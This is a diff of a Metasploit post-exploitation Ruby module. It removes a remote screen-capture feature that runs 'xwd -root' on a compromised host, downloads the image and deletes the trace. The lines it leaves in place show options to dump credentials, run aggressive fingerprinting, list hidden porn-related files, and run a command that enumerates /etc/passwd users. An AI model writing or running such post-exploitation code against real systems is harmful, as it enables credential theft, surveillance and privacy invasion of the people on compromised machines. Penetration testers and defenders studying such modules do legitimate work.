@@ -27,7 +27,6 @@
 # Dump remote credentials from target?         => set CREDENTIALS_DUMP true
 # list hidden folders/pics/vids porn related?' => set THE_FAPENNING true
 # The bash command to execute remotly          => set SINGLE_COMMAND for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done
-# Take one screenshot of remote desktop?       => set SCREEN_CAPTURE true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE (execute in terminal) ]
@@ -130,7 +129,6 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('SCREEN_CAPTURE', [false, 'Take one screenshot of remote desktop?', false]),
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Run agressive system fingerprints scans?', false]),
                                 OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target system?', false]),
                                 OptBool.new('THE_FAPENNING', [false, 'list hidden folders/pics/vids porn related?', false]),
@@ -550,31 +548,6 @@ def run
        # print the contents of (data_dump) local variable on screen ..
        print_line(data_dump)
        Rex::sleep(0.2)
-
-
-
-     #
-     # mitre ATT&CK T1113 - Screen capture (remote desktop)
-     #
-     if datastore['SCREEN_CAPTURE'] == true
-       print_status("Taking a screenshot of: #{sys_info['Computer']}")
-       cmd_exec("xwd -root -out /tmp/ScreenShot.xwd")
-       Rex::sleep(1)
-         # make sure that file was build
-         path = "/tmp/ScreenShot.xwd"
-         if not session.fs.file.exist?(path)
-           print_error("module can not create ScreenShot.xwd in /tmp remote folder")
-           return nil
-         end
-       # download remote file
-       client.fs.file.download("/root/ScreenShot.xwd","/tmp/ScreenShot.xwd")
-       print_status("ScreenShot stored in: /root/ScreenShot.xwd")
-       print_warning("To view screenshot use: xwud -in /root/ScreenShot.xwd")
-       Rex::sleep(1)
-       # delete remote file
-       client.fs.file.rm("/tmp/ScreenShot.xwd")
-     end
-
 
 
      #
